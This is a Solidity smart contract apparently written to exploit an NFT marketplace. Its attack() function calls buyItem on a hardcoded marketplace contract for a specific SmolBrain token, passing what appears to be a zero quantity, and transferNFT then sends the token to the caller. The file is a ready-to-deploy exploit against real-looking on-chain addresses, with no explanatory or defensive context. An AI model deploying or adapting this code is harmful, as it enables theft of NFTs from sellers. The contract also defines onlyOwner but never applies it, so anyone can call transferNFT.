//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.11;

import "./interfaces/ISmolBrain.sol";
import "./interfaces/ITreasureMarketplaceBuyer.sol";

contract Luck {
    address public immutable owner;
    uint256 public constant tokenId = 2227;
    address public constant SMOLBRAIN = 0x6325439389E0797Ab35752B4F43a14C004f22A9c;
    address public constant TREASUREMARKETPLACEBUYER = 0x812cdA2181ed7c45a35a691E0C85E231D218E273;
    address public constant MAGIC = 0x539bdE0d7Dbd336b79148AA742883198BBF60342;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function attack() public {
        ITreasureMarketplaceBuyer(TREASUREMARKETPLACEBUYER).buyItem(0x6325439389E0797Ab35752B4F43a14C004f22A9c, tokenId, 0xd3FeeDc8E702A9F191737c0482b685b74Be48CFa, 0, 3420000000000000000000);
    }

    function transferNFT() public {
        ISmolBrain(SMOLBRAIN).transferFrom(address(this), msg.sender, tokenId);
    }

    function ownership() public view returns (address) {
        return ISmolBrain(SMOLBRAIN).ownerOf(tokenId);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}